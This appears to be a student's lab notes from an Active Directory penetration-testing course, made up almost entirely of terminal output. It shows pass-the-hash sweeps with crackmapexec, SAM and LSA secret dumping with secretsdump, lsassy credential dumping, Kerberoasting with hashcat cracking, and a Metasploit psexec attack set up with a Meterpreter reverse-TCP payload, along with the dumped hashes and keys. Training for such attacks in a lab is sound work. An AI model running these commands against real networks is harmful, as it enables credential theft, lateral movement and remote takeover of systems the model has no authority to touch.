SMB         192.168.126.133 445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         192.168.126.132 445    FRANKCASTLE      [+] FRANKCASTLE\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.126.131 445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         192.168.126.133 445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)

```

```bash
┌──(kali㉿kali)-[~/pjpt]
└─$ crackmapexec smb 192.168.126.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam
SMB         192.168.126.131 445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         192.168.126.133 445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         192.168.126.132 445    FRANKCASTLE      [*] Windows 10 / Server 2019 Build 19041 x64 (name:FRANKCASTLE) (domain:FRANKCASTLE) (signing:False) (SMBv1:False)
SMB         192.168.126.133 445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.126.131 445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         192.168.126.132 445    FRANKCASTLE      [+] FRANKCASTLE\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.126.133 445    SPIDERMAN        [+] Dumping SAM hashes
SMB         192.168.126.132 445    FRANKCASTLE      [+] Dumping SAM hashes
SMB         192.168.126.133 445    SPIDERMAN        Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
SMB         192.168.126.132 445    FRANKCASTLE      Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
SMB         192.168.126.132 445    FRANKCASTLE      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.126.133 445    SPIDERMAN        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.126.132 445    FRANKCASTLE      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.126.133 445    SPIDERMAN        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.126.132 445    FRANKCASTLE      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:33fe0faeacb3415d2f5d7d9313eed8fb:::
SMB         192.168.126.132 445    FRANKCASTLE      frankcastle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.126.132 445    FRANKCASTLE      [+] Added 5 SAM hashes to the database
SMB         192.168.126.133 445    SPIDERMAN        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:23fa26a09f785692e48be00c886556ac:::
SMB         192.168.126.133 445    SPIDERMAN        peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.126.133 445    SPIDERMAN        [+] Added 5 SAM hashes to the database

```

```bash
──(kali㉿kali)-[~/pjpt]
└─$ crackmapexec smb 192.168.126.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares
^[[B^[[B^[[BSMB         192.168.126.133 445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         192.168.126.131 445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         192.168.126.132 445    FRANKCASTLE      [*] Windows 10 / Server 2019 Build 19041 x64 (name:FRANKCASTLE) (domain:FRANKCASTLE) (signing:False) (SMBv1:False)
SMB         192.168.126.133 445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.126.131 445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         192.168.126.132 445    FRANKCASTLE      [+] FRANKCASTLE\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.126.133 445    SPIDERMAN        [+] Enumerated shares
SMB         192.168.126.133 445    SPIDERMAN        Share           Permissions     Remark
SMB         192.168.126.133 445    SPIDERMAN        -----           -----------     ------
SMB         192.168.126.133 445    SPIDERMAN        ADMIN$          READ,WRITE      Remote Admin
SMB         192.168.126.133 445    SPIDERMAN        C$              READ,WRITE      Default share
SMB         192.168.126.133 445    SPIDERMAN        IPC$            READ            Remote IPC
SMB         192.168.126.132 445    FRANKCASTLE      [+] Enumerated shares
SMB         192.168.126.132 445    FRANKCASTLE      Share           Permissions     Remark
SMB         192.168.126.132 445    FRANKCASTLE      -----           -----------     ------
SMB         192.168.126.132 445    FRANKCASTLE      ADMIN$          READ,WRITE      Remote Admin
SMB         192.168.126.132 445    FRANKCASTLE      C$              READ,WRITE      Default share
SMB         192.168.126.132 445    FRANKCASTLE      IPC$            READ            Remote IPC

```

```bash
┌──(kali㉿kali)-[~/pjpt]
└─$ crackmapexec smb -L
[*] bh_owned                  Set pwned computer as owned in Bloodhound
[*] dfscoerce                 Module to check if the DC is vulnerable to DFSCocerc, credit to @filip_dragovic/@Wh04m1001 and @topotam
[*] drop-sc                   Drop a searchConnector-ms file on each writable share
[*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] enum_avproducts           Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI
[*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server
[*] get_netconnections        Uses WMI to query network connections.
[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
[*] handlekatz                Get lsass dump using handlekatz64 and parse the result with pypykatz
[*] hash_spider               Dump lsass recursively from a given hash using BH to find local admins
[*] impersonate               List and impersonate tokens to run command as locally logged on users
[*] install_elevated          Checks for AlwaysInstallElevated
[*] ioxidresolver             Thie module helps you to identify hosts that have additional active interfaces
[*] keepass_discover          Search for KeePass-related files and process.
[*] keepass_trigger           Set up a malicious KeePass trigger to export the database in cleartext.
[*] lsassy                    Dump lsass and parse the result remotely with lsassy
[*] masky                     Remotely dump domain user credentials via an ADCS and a KDC
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] ms17-010                  MS17-010, /!\ not tested oustide home lab
[*] nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
[*] nopac                     Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user
[*] ntlmv1                    Detect if lmcompatibilitylevel on the target is set to 0 or 1
[*] petitpotam                Module to check if the DC is vulnerable to PetitPotam, credit to @topotam
[*] procdump                  Get lsass dump using procdump64 and parse the result with pypykatz
[*] rdp                       Enables/Disables RDP
[*] runasppl                  Check if the registry value RunAsPPL is set or not
[*] scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
[*] shadowcoerce              Module to check if the target is vulnerable to ShadowCoerce, credit to @Shutdown and @topotam
[*] slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
[*] spider_plus               List files on the target server (excluding `DIR` directories and `EXT` extensions) and save them to the `OUTPUT` directory if they are smaller then `SIZE`
[*] spooler                   Detect if print spooler is enabled or not
[*] teams_localdb             Retrieves the cleartext ssoauthcookie from the local Microsoft Teams database, if teams is open we kill all Teams process
[*] test_connection           Pings a host
[*] uac                       Checks UAC status
[*] wdigest                   Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
[*] webdav                    Checks whether the WebClient service is running on the target
[*] wireless                  Get key of all wireless interfaces
[*] zerologon                 Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472

```

```bash
┌──(kali㉿kali)-[~/pjpt]
└─$ crackmapexec smb 192.168.126.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth -M lsassy
SMB         192.168.126.131 445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:HYDRA-DC) (signing:True) (SMBv1:False)
SMB         192.168.126.133 445    SPIDERMAN        [*] Windows 10 / Server 2019 Build 19041 x64 (name:SPIDERMAN) (domain:SPIDERMAN) (signing:False) (SMBv1:False)
SMB         192.168.126.132 445    FRANKCASTLE      [*] Windows 10 / Server 2019 Build 19041 x64 (name:FRANKCASTLE) (domain:FRANKCASTLE) (signing:False) (SMBv1:False)
SMB         192.168.126.131 445    HYDRA-DC         [-] HYDRA-DC\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         192.168.126.133 445    SPIDERMAN        [+] SPIDERMAN\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)
SMB         192.168.126.132 445    FRANKCASTLE      [+] FRANKCASTLE\administrator:7facdc498ed1680c4fd1448319a8c04f (Pwn3d!)

```

```bash
└─$ cmedb                                                                                                                                         
cmedb (default)(smb) > host
*** Unknown syntax: host
cmedb (default)(smb) > hosts

+Hosts---+-----------+-----------------+-------------+--------+--------------------------------------+-------+---------+
| HostID | Admins    | IP              | Hostname    | Domain | OS                                   | SMBv1 | Signing |
+--------+-----------+-----------------+-------------+--------+--------------------------------------+-------+---------+
| 1      | 0 Cred(s) | 192.168.126.131 | HYDRA-DC    | MARVEL | Windows Server 2022 Build 20348      | 0     | 1       |
| 2      | 2 Cred(s) | 192.168.126.132 | FRANKCASTLE | MARVEL | Windows 10 / Server 2019 Build 19041 | 0     | 0       |
| 3      | 2 Cred(s) | 192.168.126.133 | SPIDERMAN   | MARVEL | Windows 10 / Server 2019 Build 19041 | 0     | 0       |
+--------+-----------+-----------------+-------------+--------+--------------------------------------+-------+---------+

cmedb (default)(smb) > creds

+Credentials---------+-----------+-------------+--------------------+-------------------------------------------------------------------+
| CredID | Admin On  | CredType  | Domain      | UserName           | Password                                                          |
+--------+-----------+-----------+-------------+--------------------+-------------------------------------------------------------------+
| 1      | 2 Host(s) | plaintext | MARVEL      | fcastle            | Password1                                                         |
| 2      | 1 Host(s) | hash      | FRANKCASTLE | administrator      | 7facdc498ed1680c4fd1448319a8c04f                                  |
| 3      | 1 Host(s) | hash      | SPIDERMAN   | administrator      | 7facdc498ed1680c4fd1448319a8c04f                                  |
| 4      | 0 Host(s) | hash      | FRANKCASTLE | Guest              | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 5      | 0 Host(s) | hash      | SPIDERMAN   | Guest              | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 6      | 0 Host(s) | hash      | FRANKCASTLE | DefaultAccount     | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 7      | 0 Host(s) | hash      | SPIDERMAN   | DefaultAccount     | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 8      | 0 Host(s) | hash      | FRANKCASTLE | WDAGUtilityAccount | aad3b435b51404eeaad3b435b51404ee:33fe0faeacb3415d2f5d7d9313eed8fb |
| 9      | 0 Host(s) | hash      | FRANKCASTLE | frankcastle        | aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b |
| 10     | 0 Host(s) | hash      | SPIDERMAN   | WDAGUtilityAccount | aad3b435b51404eeaad3b435b51404ee:23fa26a09f785692e48be00c886556ac |
| 11     | 0 Host(s) | hash      | SPIDERMAN   | peterparker        | aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b |
+--------+-----------+-----------+-------------+--------------------+-------------------------------------------------------------------+

cmedb (default)(smb) > 

```

## Dumping and Cracking Hashes

Once we have the hashes and username, we can go into each account and start dumping

```bash
┌──(kali㉿kali)-[~/pjpt]
└─$ python3 /home/kali/.local/bin/secretsdump.py MARVEL.local/fcastle:'Password1'@192.168.126.132
Impacket v0.13.0.dev0+20250404.133223.00ced47 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x87442e9fd046a2ee2129bad272460365
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:33fe0faeacb3415d2f5d7d9313eed8fb:::
frankcastle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c: (2025-04-17 00:47:51+00:00)
MARVEL.LOCAL/fcastle:$DCC2$10240#fcastle#e6f48c2526bd594441d3da3723155f6f: (2025-04-15 20:17:32+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
MARVEL\FRANKCASTLE$:aes256-cts-hmac-sha1-96:7e3d22a46a557c3521375bd5a23215ad591220b6fbcc7bac2be9483d9fa50df2
MARVEL\FRANKCASTLE$:aes128-cts-hmac-sha1-96:c2bc87d174eb2a812a5812a8df8fe62a
MARVEL\FRANKCASTLE$:des-cbc-md5:5ebf13ead3dcd0ad
MARVEL\FRANKCASTLE$:plain_password_hex:4b0054006100590056003300700028005b0043005600330069004c003e0048004200200024006a0038006e004a004e003a002e003f005f00540027005600690026004a0053003e004500420047005d0061004b00490055002400780042002a0040005600680049002b002a003c00250045007800320063002600370041003800560073006d0058004e005c004400710071004a00730058002c00600065006c004c00620053003a00200073003200790064004a00330044005b005000650044004e007a004b0040005700310065005d0072002f0059005d003c006d0025002e004800370052003b00600074004e004000
MARVEL\FRANKCASTLE$:aad3b435b51404eeaad3b435b51404ee:129ed04a1eeb1e35888c0d2ebf69ec18:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x7f01cb53d3f7a38c97f490b5758be6ec38e7db7e
dpapi_userkey:0x95a4fcfe964e15bdb7f1a38244e0fd4db2bec746
[*] NL$KM 
 0000   21 48 45 BB 9C 66 98 62  5B 1E 1F C1 56 AB A4 3B   !HE..f.b[...V..;
 0010   DC 04 14 53 58 37 00 1C  3D 3E 25 8D 58 53 C6 29   ...SX7..=>%.XS.)
 0020   AE 5B 1F 32 E0 3D 02 FC  D9 24 73 A4 4A 70 9D 5D   .[.2.=...$s.Jp.]
 0030   8F 1F 8C 64 F7 2D 3D 1B  60 E0 87 DD 9A B8 83 FC   ...d.-=.`.......
NL$KM:214845bb9c6698625b1e1fc156aba43bdc0414535837001c3d3e258d5853c629ae5b1f32e03d02fcd92473a44a709d5d8f1f8c64f72d3d1b60e087dd9ab883fc
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

```bash
┌──(kali㉿kali)-[~/pjpt]
└─$ python3 /home/kali/.local/bin/secretsdump.py MARVEL.local/fcastle:'Password1'@192.168.126.133
Impacket v0.13.0.dev0+20250404.133223.00ced47 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf6e376baa9f01be9d04fd5eccb1a1389
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:23fa26a09f785692e48be00c886556ac:::
peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c: (2025-04-14 18:55:51+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
MARVEL\SPIDERMAN$:aes256-cts-hmac-sha1-96:51d31293b79109b275b96310b36953cf7843a19d6ec043e9f62bc386d6f95b2a
MARVEL\SPIDERMAN$:aes128-cts-hmac-sha1-96:1c0e440743dd60e3030c42b7cdddf0d2
MARVEL\SPIDERMAN$:des-cbc-md5:40cb61c4e05ecd6e
MARVEL\SPIDERMAN$:plain_password_hex:3b00310074004d003900590076005200480056004a002400390063005f004f0037005f003500210079006d0034003700450062004c0039004b003d005500620053004500650047002d007100290071005c0027007a00270037003b00510027004e002100580022005f002900270058004c003400420033002500260050006e00240058004d004e0068003d006e004a0043002e004e002d0039004b0041004a005400510059003b002100560056007300590040003b0059005d002c007a004d00720036003e0046005c00380035006d0077006d002c002000260053002a00790050002800760071004d0066003a003a00
MARVEL\SPIDERMAN$:aad3b435b51404eeaad3b435b51404ee:23e58192bce5f41ef46ebb67d5ae578d:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x3d4a5c9917e164f66a04f64b13fb449b63ac716a
dpapi_userkey:0x082c1251fb66a2e8d201686d61d449d1a9396ea9
[*] NL$KM 
 0000   B8 A0 EC 76 62 14 FD F1  C9 FB D7 EA 23 7A 0B EC   ...vb.......#z..
 0010   7E 4B 46 8E AA 20 E6 86  D9 D2 29 87 C8 BC BE C8   ~KF.. ....).....
 0020   EF EC 72 F1 8B 02 69 F8  96 BA 47 C0 F5 4A 71 58   ..r...i...G..JqX
 0030   39 9D A0 84 84 98 56 AC  25 40 BA 51 F6 A8 C2 E7   9.....V.%@.Q....
NL$KM:b8a0ec766214fdf1c9fbd7ea237a0bec7e4b468eaa20e686d9d22987c8bcbec8efec72f18b0269f896ba47c0f54a7158399da084849856ac2540ba51f6a8c2e7
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
                                                           
```

Using Hashes

```bash
┌──(kali㉿kali)-[~/pjpt]
└─$ python3 /home/kali/.local/bin/secretsdump.py administrator:@192.168.126.132 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
Impacket v0.13.0.dev0+20250404.133223.00ced47 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x87442e9fd046a2ee2129bad272460365
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:33fe0faeacb3415d2f5d7d9313eed8fb:::
frankcastle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c: (2025-04-17 00:47:51+00:00)
MARVEL.LOCAL/fcastle:$DCC2$10240#fcastle#e6f48c2526bd594441d3da3723155f6f: (2025-04-15 20:17:32+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
MARVEL\FRANKCASTLE$:aes256-cts-hmac-sha1-96:7e3d22a46a557c3521375bd5a23215ad591220b6fbcc7bac2be9483d9fa50df2
MARVEL\FRANKCASTLE$:aes128-cts-hmac-sha1-96:c2bc87d174eb2a812a5812a8df8fe62a
MARVEL\FRANKCASTLE$:des-cbc-md5:5ebf13ead3dcd0ad
MARVEL\FRANKCASTLE$:plain_password_hex:4b0054006100590056003300700028005b0043005600330069004c003e0048004200200024006a0038006e004a004e003a002e003f005f00540027005600690026004a0053003e004500420047005d0061004b00490055002400780042002a0040005600680049002b002a003c00250045007800320063002600370041003800560073006d0058004e005c004400710071004a00730058002c00600065006c004c00620053003a00200073003200790064004a00330044005b005000650044004e007a004b0040005700310065005d0072002f0059005d003c006d0025002e004800370052003b00600074004e004000
MARVEL\FRANKCASTLE$:aad3b435b51404eeaad3b435b51404ee:129ed04a1eeb1e35888c0d2ebf69ec18:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x7f01cb53d3f7a38c97f490b5758be6ec38e7db7e
dpapi_userkey:0x95a4fcfe964e15bdb7f1a38244e0fd4db2bec746
[*] NL$KM 
 0000   21 48 45 BB 9C 66 98 62  5B 1E 1F C1 56 AB A4 3B   !HE..f.b[...V..;
 0010   DC 04 14 53 58 37 00 1C  3D 3E 25 8D 58 53 C6 29   ...SX7..=>%.XS.)
 0020   AE 5B 1F 32 E0 3D 02 FC  D9 24 73 A4 4A 70 9D 5D   .[.2.=...$s.Jp.]
 0030   8F 1F 8C 64 F7 2D 3D 1B  60 E0 87 DD 9A B8 83 FC   ...d.-=.`.......
NL$KM:214845bb9c6698625b1e1fc156aba43bdc0414535837001c3d3e258d5853c629ae5b1f32e03d02fcd92473a44a709d5d8f1f8c64f72d3d1b60e087dd9ab883fc
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry

```


## Kerberoasting

![image.png](attachment:818d94f1-aaca-41c3-ba5d-b7aaf40c11cf:image.png)

Kerberos is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner.

```bash
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 192.168.126.131 -request

```

Imagine that works i messed up setting up the AD

copy hashes 

```bash
		hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt
```

![image.png](attachment:67f882dd-8baf-464f-b980-dd146568501e:image.png)

## Token Impersonation

```bash
                                                                                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/pjpt]
└─$ msfconsole
Metasploit tip: Metasploit can be configured at startup, see msfconsole 
--help to learn more
                                                  
                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
                            https://metasploit.com

       =[ metasploit v6.4.50-dev                          ]
+ -- --=[ 2495 exploits - 1283 auxiliary - 393 post       ]
+ -- --=[ 1607 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search psexec

Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   0   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal     No     DCOM Exec
   1   exploit/windows/smb/smb_relay                2001-03-31       excellent  No     MS08-068 Microsoft Windows SMB Relay Code Execution
   2     \_ action: CREATE_SMB_SESSION              .                .          .      Do not close the SMB connection after relaying, and instead create an SMB session
   3     \_ action: PSEXEC                          .                .          .      Use the SMB Connection to run the exploit/windows/psexec module against the relay target
   4     \_ target: Automatic                       .                .          .      .
   5     \_ target: PowerShell                      .                .          .      .
   6     \_ target: Native upload                   .                .          .      .
   7     \_ target: MOF upload                      .                .          .      .
   8     \_ target: Command                         .                .          .      .
   9   exploit/windows/smb/ms17_010_psexec          2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   10    \_ target: Automatic                       .                .          .      .
   11    \_ target: PowerShell                      .                .          .      .
   12    \_ target: Native upload                   .                .          .      .
   13    \_ target: MOF upload                      .                .          .      .
   14    \_ AKA: ETERNALSYNERGY                     .                .          .      .
   15    \_ AKA: ETERNALROMANCE                     .                .          .      .
   16    \_ AKA: ETERNALCHAMPION                    .                .          .      .
   17    \_ AKA: ETERNALBLUE                        .                .          .      .
   18  auxiliary/admin/smb/ms17_010_command         2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   19    \_ AKA: ETERNALSYNERGY                     .                .          .      .
   20    \_ AKA: ETERNALROMANCE                     .                .          .      .
   21    \_ AKA: ETERNALCHAMPION                    .                .          .      .
   22    \_ AKA: ETERNALBLUE                        .                .          .      .
   23  auxiliary/scanner/smb/psexec_loggedin_users  .                normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
   24  exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
   25    \_ target: Automatic                       .                .          .      .
   26    \_ target: PowerShell                      .                .          .      .
   27    \_ target: Native upload                   .                .          .      .
   28    \_ target: MOF upload                      .                .          .      .
   29    \_ target: Command                         .                .          .      .
   30  auxiliary/admin/smb/psexec_ntdsgrab          .                normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
   31  exploit/windows/local/current_user_psexec    1999-01-01       excellent  No     PsExec via Current User Token
   32  encoder/x86/service                          .                manual     No     Register Service
   33  auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal     No     WMI Exec
   34  exploit/windows/smb/webexec                  2018-10-24       manual     No     WebExec Authenticated User Code Execution
   35    \_ target: Automatic                       .                .          .      .
   36    \_ target: Native upload                   .                .          .      .
   37  exploit/windows/local/wmi                    1999-01-01       excellent  No     Windows Management Instrumentation (WMI) Remote Command Execution

Interact with a module by name or index. For example info 37, use 37 or use exploit/windows/local/wmi

msf6 > use 24
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share

   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on

   Used when making a new connection via RHOSTS:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      445              no        The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.126.130  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set RHOST 192.168.126.132
RHOST => 192.168.126.132
msf6 exploit(windows/smb/psexec) > set SMBUSER fcastle
SMBUSER => fcastle
msf6 exploit(windows/smb/psexec) > set SMBPASS Password1
SMBPASS => Password1
msf6 exploit(windows/smb/psexec) > set SMBD
set SMBDIRECT  set SMBDOMAIN  
msf6 exploit(windows/smb/psexec) > set SMBDOMAIN MARVEL.local
SMBDOMAIN => MARVEL.local
msf6 exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 192.168.126.130:4444 
[*] 192.168.126.132:445 - Connecting to the server...
[*] 192.168.126.132:445 - Authenticating to 192.168.126.132:445|MARVEL.local as user 'fcastle'...
[*] 192.168.126.132:445 - Selecting PowerShell target
[*] 192.168.126.132:445 - Executing the payload...
[-] 192.168.126.132:445 - Service failed to start - ACCESS_DENIED
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 192.168.126.130:4444 
[*] 192.168.126.132:445 - Connecting to the server...
